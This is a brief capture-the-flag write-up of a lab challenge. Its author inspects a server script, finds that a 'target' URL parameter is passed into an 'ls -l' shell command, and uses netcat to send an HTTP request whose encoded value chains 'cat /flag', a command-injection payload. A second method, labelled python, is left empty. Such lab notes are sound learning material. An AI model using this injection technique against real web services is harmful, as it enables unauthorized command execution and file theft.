## ✅ what i did  
I WAY -> netcat
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
found out the only endpoint available is /mission
the server sends back the output of aguments that had been passed through the url
by default it concatenates them to "ls -l {args}"
the server expects an argument called target, in which assigns to it as default "/challenge" if no args had been provided
so the goal is to inject our crafted command as value of target in the url
-ran: '/challenge/server'
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /mission?target=bro%3B%20cat%20%2Fflag HTTP/1.1'
        'Host: challenge.localhost'
-flag popped out

II WAY -> python
